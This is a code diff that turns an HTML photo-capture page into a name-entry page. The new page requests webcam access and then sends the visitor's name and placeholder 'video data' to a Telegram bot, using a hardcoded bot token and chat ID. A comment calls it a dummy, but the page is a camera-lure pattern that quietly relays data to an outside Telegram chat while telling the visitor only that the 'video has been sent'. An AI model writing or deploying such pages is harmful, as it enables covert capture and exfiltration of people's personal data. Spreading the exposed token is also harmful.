@@ -3,50 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Photo</title>
+    <title>Camera Access</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        #container {
+            margin-top: 20%;
+        }
+        input[type="text"] {
+            padding: 10px;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-    <h1>Capture a Photo</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <button id="snap">Take Photo</button>
-    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <div id="container">
+        <h1>Please Enter Your Name</h1>
+        <input type="text" id="username" placeholder="Enter your name" required>
+        <br><br>
+        <button onclick="requestCamera()">OK</button>
+    </div>
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        const snap = document.getElementById('snap');
+        async function requestCamera() {
+            const username = document.getElementById('username').value;
+            if (!username) {
+                alert('Please enter your name');
+                return;
+            }
 
-        // Access the camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+            // Request camera access
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Start video stream
+                let video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-            })
-            .catch(err => {
-                console.error("Error accessing the camera: ", err);
-            });
+                
+                // Simulate recording and send to Telegram (dummy example)
+                setTimeout(() => {
+                    sendToTelegram(username, 'Video data here');
+                    alert('Your video has been sent!');
+                }, 5000); // Simulate recording duration
+                
+            } catch (error) {
+                alert('Camera access denied.');
+            }
+        }
 
-        // Capture photo
-        snap.addEventListener('click', () => {
-            context.drawImage(video, 0, 0, 640, 480);
-            const dataURL = canvas.toDataURL('image/png');
-            
-            // Send the photo to the backend server
-            fetch('/api/upload', {
+        function sendToTelegram(username, videoData) {
+            // Create the request to send video data to Telegram
+            const botToken = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es';
+            const chatId = '5112680061';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ image: dataURL }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
-        });
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `User: ${username}\nVideo Data: ${videoData}`
+                }),
+            }).then(response => response.json())
+              .then(data => console.log('Success:', data))
+              .catch((error) => console.error('Error:', error));
+        }
     </script>
 </body>
 </html>
